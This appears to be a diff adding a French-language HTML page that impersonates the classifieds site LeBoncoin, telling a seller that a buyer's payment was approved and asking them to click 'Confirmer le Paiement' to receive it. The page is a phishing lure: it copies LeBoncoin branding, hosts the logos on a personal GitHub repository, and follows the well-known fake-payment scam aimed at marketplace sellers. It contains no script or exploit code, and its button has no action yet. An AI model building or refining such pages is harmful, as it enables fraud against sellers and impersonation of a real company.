@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notification de Paiement</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white; /* Arrière-plan en blanc */
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Alignement en haut pour permettre le défilement */
+            min-height: 100vh;
+            position: relative;
+            overflow-y: auto; /* Active la barre de défilement verticale */
+        }
+        .platform {
+            background-color: white;
+            border-radius: 20px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            margin-top: 70px; /* Espace pour le logo en haut */
+            margin-bottom: 150px; /* Espace pour le logo en bas */
+        }
+        h1 {
+            color: green;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        .header-logo {
+            position: fixed; /* Fixé en arrière-plan */
+            top: 0; /* Positionné en haut de la page */
+            left: 0;
+            width: 100%; /* Étendu sur toute la largeur */
+            height: 70px; /* Hauteur réduite */
+            object-fit: cover; /* Ajuste l'image pour couvrir la largeur */
+            z-index: 0; /* Place le logo en arrière-plan */
+            filter: contrast(1.2); /* Augmente le contraste du logo */
+        }
+        .footer-logo {
+            position: absolute;
+            bottom: 0; /* Positionné en bas de la page */
+            left: 0;
+            width: 100%; /* Étendu sur toute la largeur */
+            height: auto;
+            z-index: 0; /* Place le logo en arrière-plan */
+            opacity: 0.8; /* Rend le logo légèrement transparent */
+        }
+        .validation-container {
+            position: relative;
+            width: 160px;
+            height: 160px;
+            margin: 30px auto;
+        }
+        .validation-square {
+            width: 160px;
+            height: 160px;
+            background: linear-gradient(45deg, #ff8c00, #ff4500);
+            border-radius: 25px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            box-sizing: border-box;
+            animation: square-pop 0.8s ease-in-out forwards, gradient-shift 3s infinite alternate;
+            box-shadow: 0 8px 20px rgba(255, 69, 0, 0.4);
+        }
+        .checkmark {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            width: 80px;
+            height: 80px;
+            animation: checkmark-appear 0.5s ease-in-out 0.8s forwards, bounce 0.5s ease-in-out 1.3s;
+        }
+        .checkmark path {
+            stroke: white;
+            stroke-width: 6;
+            stroke-dasharray: 100;
+            stroke-dashoffset: 100;
+            animation: draw-checkmark 0.5s ease-in-out 0.8s forwards;
+        }
+        @keyframes square-pop {
+            0% {
+                transform: scale(0) rotate(0deg);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.2) rotate(10deg);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(1) rotate(0deg);
+                opacity: 1;
+            }
+        }
+        @keyframes gradient-shift {
+            0% {
+                background: linear-gradient(45deg, #ff8c00, #ff4500);
+            }
+            100% {
+                background: linear-gradient(45deg, #ff4500, #ff8c00);
+            }
+        }
+        @keyframes checkmark-appear {
+            0% {
+                transform: translate(-50%, -50%) scale(0);
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+        @keyframes draw-checkmark {
+            0% {
+                stroke-dashoffset: 100;
+            }
+            100% {
+                stroke-dashoffset: 0;
+            }
+        }
+        @keyframes bounce {
+            0%, 100% {
+                transform: translate(-50%, -50%) scale(1);
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.2);
+            }
+        }
+        .button {
+            background-color: green;
+            color: white;
+            padding: 18px 36px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 18px;
+            margin: 30px 0;
+            cursor: pointer;
+            border: none;
+            border-radius: 10px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 4px 10px rgba(0, 128, 0, 0.3);
+        }
+        .button:hover {
+            background-color: darkgreen;
+            transform: translateY(-2px);
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo en haut, étendu sur toute la largeur et en arrière-plan -->
+    <a href="https://www.leboncoin.fr" target="_blank">
+        <img src="https://raw.githubusercontent.com/zapata225/lebon/refs/heads/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20110632.png" alt="Logo LeBoncoin" class="header-logo">
+    </a>
+
+    <!-- Plateforme de paiement -->
+    <div class="platform">
+        <h1>Vous avez reçu de l'argent.</h1>
+        <p>Ce paiement LeBoncoin a été déduit du compte de l’acheteur<br>et a été « APPROUVÉ » par sa banque.</p>
+        
+        <!-- Animation de validation carrée avec coche modernisée -->
+        <div class="validation-container">
+            <div class="validation-square"></div>
+            <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                <path fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+            </svg>
+        </div>
+
+        <p>Pour recevoir le paiement sur votre compte, cliquez ici :</p>
+        <button class="button">Confirmer le Paiement</button>
+        <p>Cordialement,<br>LeBoncoin.</p>
+    </div>
+
+    <!-- Logo en bas, étendu sur toute la largeur -->
+    <img src="https://github.com/zapata225/lebon/blob/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20115029.png?raw=true" alt="Logo LeBoncoin Bas" class="footer-logo">
+</body>
+</html>
